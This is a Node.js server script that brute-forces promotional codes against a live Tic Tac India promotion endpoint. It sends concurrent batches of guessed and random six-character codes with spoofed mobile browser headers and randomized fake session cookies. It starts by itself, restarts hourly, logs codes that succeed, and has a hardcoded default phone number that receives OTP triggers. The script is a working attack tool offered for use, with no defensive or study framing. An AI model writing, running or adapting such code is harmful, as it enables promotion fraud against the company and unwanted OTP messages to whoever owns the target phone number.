const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const cron = require('node-cron');
require('dotenv').config();

class TicTacOTPGenerator {
    constructor() {
        this.app = express();
        this.server = http.createServer(this.app);
        this.wss = new WebSocket.Server({ server: this.server });
        
        // Configuration
        this.baseUrl = 'https://www.tictac.com';
        this.endpoint = '/in/en/xp/jarpecarpromo/home/generateOTP';
        this.phoneNumber = process.env.PHONE_NUMBER || '8284084799';
        this.isRunning = false;
        this.successfulCodes = [];
        this.attempts = 0;
        this.maxAttempts = 1000;
        this.threads = 3;
        
        // WebSocket clients
        this.clients = new Set();
        
        // Setup middleware
        this.setupMiddleware();
        this.setupRoutes();
        this.setupWebSocket();
        this.setupAutoRestart();
        
        // Initialize
        this.initialize();
    }

    setupMiddleware() {
        this.app.use(cors());
        this.app.use(express.json());
        this.app.use(express.static(path.join(__dirname, 'public')));
    }

    setupRoutes() {
        // API Routes
        this.app.get('/', (req, res) => {
            res.json({
                status: 'running',
                uptime: process.uptime(),
                successfulCodes: this.successfulCodes.length,
                attempts: this.attempts,
                isRunning: this.isRunning
            });
        });

        this.app.post('/api/start', (req, res) => {
            if (!this.isRunning) {
                this.startGeneration();
                res.json({ message: 'OTP generation started' });
            } else {
                res.json({ message: 'Already running' });
            }
        });

        this.app.post('/api/stop', (req, res) => {
            this.stopGeneration();
            res.json({ message: 'OTP generation stopped' });
        });

        this.app.get('/api/codes', (req, res) => {
            res.json({
                successfulCodes: this.successfulCodes,
                totalAttempts: this.attempts,
                recentCodes: this.successfulCodes.slice(-10)
            });
        });

        this.app.post('/api/test-codes', async (req, res) => {
            const { codes } = req.body;
            if (codes && Array.isArray(codes)) {
                await this.testSpecificCodes(codes);
                res.json({ message: 'Testing specific codes', codes });
            } else {
                res.status(400).json({ error: 'Invalid codes array' });
            }
        });

        this.app.post('/api/phone', (req, res) => {
            const { phone } = req.body;
            if (phone) {
                this.phoneNumber = phone;
                res.json({ message: 'Phone number updated', phone });
            } else {
                res.status(400).json({ error: 'Invalid phone number' });
            }
        });
    }

    setupWebSocket() {
        this.wss.on('connection', (ws, req) => {
            console.log('New WebSocket connection');
            this.clients.add(ws);

            // Send current status
            ws.send(JSON.stringify({
                type: 'status',
                data: {
                    isRunning: this.isRunning,
                    successfulCodes: this.successfulCodes.length,
                    attempts: this.attempts,
                    recentCodes: this.successfulCodes.slice(-5)
                }
            }));

            ws.on('close', () => {
                console.log('WebSocket disconnected');
                this.clients.delete(ws);
            });

            ws.on('error', (error) => {
                console.error('WebSocket error:', error);
                this.clients.delete(ws);
            });
        });
    }

    broadcast(data) {
        const message = JSON.stringify(data);
        this.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        });
    }

    generateRandomCode(length = 6) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        return Array.from({ length }, () => 
            characters[Math.floor(Math.random() * characters.length)]
        ).join('');
    }

    generateCommonPatterns() {
        const patterns = [
            'MTWCDY', 'TICTAC', 'PROMO', 'OFFER', 'DISCOUNT', 'FREE',
            'WELCOME', 'NEWUSER', 'FIRST', 'SPECIAL', 'GIFT'
        ];

        // Add variations
        for (let i = 0; i < 100; i++) {
            patterns.push(`TT${i.toString().padStart(4, '0')}`);
            patterns.push(`PRO${i.toString().padStart(3, '0')}`);
            patterns.push(`OFF${i.toString().padStart(3, '0')}`);
        }

        return patterns;
    }

    async makeRequest(ccode) {
        const url = `${this.baseUrl}${this.endpoint}`;
        const sessionId = `1vs284nnha0gcc89i53i3oo${Math.floor(Math.random() * 200) + 800}`;
        
        const headers = {
            'Host': 'www.tictac.com',
            'sec-ch-ua-platform': '"Android"',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2315 Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'sec-ch-ua': '"Android WebView";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://www.tictac.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=1, i',
            'cookie': `PHPSESSID=${sessionId}`
        };

        const data = new URLSearchParams({
            phone: this.phoneNumber,
            ccode: ccode
        });

        try {
            const response = await axios.post(url, data.toString(), {
                headers,
                timeout: 10000,
                maxRedirects: 0,
                validateStatus: (status) => status >= 200 && status < 500
            });

            this.attempts++;

            if (response.status === 200) {
                const responseText = JSON.stringify(response.data).toLowerCase();
                if (responseText.includes('success') || responseText.includes('otp')) {
                    console.log(`✅ SUCCESS: Code '${ccode}'`);
                    this.successfulCodes.push({
                        code: ccode,
                        timestamp: new Date().toISOString(),
                        response: response.data
                    });

                    // Broadcast success
                    this.broadcast({
                        type: 'success',
                        data: { code: ccode, response: response.data }
                    });

                    return true;
                } else {
                    console.log(`❌ Failed: Code '${ccode}'`);
                }
            }
        } catch (error) {
            console.log(`❌ Error with code '${ccode}': ${error.message}`);
        }

        return false;
    }

    async processCodeBatch(codes) {
        const promises = codes.map(code => this.makeRequest(code));
        await Promise.allSettled(promises);
    }

    async startGeneration() {
        if (this.isRunning) return;
        
        this.isRunning = true;
        console.log('🔍 Starting TicTac OTP Generator...');
        console.log(`🎯 Target: ${this.phoneNumber}`);
        console.log(`🚀 Max attempts: ${this.maxAttempts}`);

        // Broadcast start
        this.broadcast({
            type: 'start',
            data: { phone: this.phoneNumber, maxAttempts: this.maxAttempts }
        });

        try {
            // Try common patterns first
            const commonCodes = this.generateCommonPatterns();
            const batchSize = this.threads;
            
            for (let i = 0; i < commonCodes.length && this.isRunning && this.attempts < this.maxAttempts; i += batchSize) {
                const batch = commonCodes.slice(i, i + batchSize);
                await this.processCodeBatch(batch);
                
                if (this.successfulCodes.length >= 5) break;
                
                // Small delay between batches
                await new Promise(resolve => setTimeout(resolve, 500));
            }

            // Try random codes
            while (this.isRunning && this.attempts < this.maxAttempts && this.successfulCodes.length < 5) {
                const randomCodes = Array.from({ length: batchSize }, () => this.generateRandomCode(6));
                await this.processCodeBatch(randomCodes);
                
                if (this.successfulCodes.length >= 5) break;
                
                await new Promise(resolve => setTimeout(resolve, 1000));
            }

        } catch (error) {
            console.error('Error during generation:', error);
        } finally {
            this.isRunning = false;
            this.broadcast({
                type: 'stop',
                data: {
                    successfulCodes: this.successfulCodes.length,
                    totalAttempts: this.attempts
                }
            });
            console.log('Generation completed');
        }
    }

    stopGeneration() {
        this.isRunning = false;
        console.log('Stopping generation...');
    }

    async testSpecificCodes(codes) {
        console.log(`🧪 Testing ${codes.length} specific codes...`);
        
        for (const code of codes) {
            if (!this.isRunning) break;
            
            const success = await this.makeRequest(code);
            if (success) {
                console.log(`✅ Code '${code}' worked!`);
            }
            
            // Delay between requests
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    }

    setupAutoRestart() {
        // Auto-restart every hour
        cron.schedule('0 * * * *', () => {
            console.log('🔄 Auto-restarting application...');
            this.broadcast({
                type: 'restart',
                data: { reason: 'scheduled', uptime: process.uptime() }
            });
            
            setTimeout(() => {
                process.exit(0);
            }, 5000);
        });

        // Memory check and restart if needed
        setInterval(() => {
            const usage = process.memoryUsage();
            const heapUsedMB = usage.heapUsed / 1024 / 1024;
            
            if (heapUsedMB > 500) { // Restart if using more than 500MB
                console.log(`🔄 High memory usage (${heapUsedMB.toFixed(2)}MB), restarting...`);
                process.exit(0);
            }
        }, 60000); // Check every minute
    }

    async initialize() {
        const PORT = process.env.PORT || 3000;
        
        this.server.listen(PORT, '0.0.0.0', () => {
            console.log(`🚀 Server running on port ${PORT}`);
            console.log(`📱 Target phone: ${this.phoneNumber}`);
            console.log(`🔗 WebSocket endpoint: ws://localhost:${PORT}`);
            console.log(`🌐 HTTP API: http://localhost:${PORT}`);
        });

        // Start generation automatically
        setTimeout(() => {
            this.startGeneration();
        }, 2000);
    }
}

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('SIGINT received, shutting down gracefully');
    process.exit(0);
});

// Start the application
const generator = new TicTacOTPGenerator();

module.exports = generator;
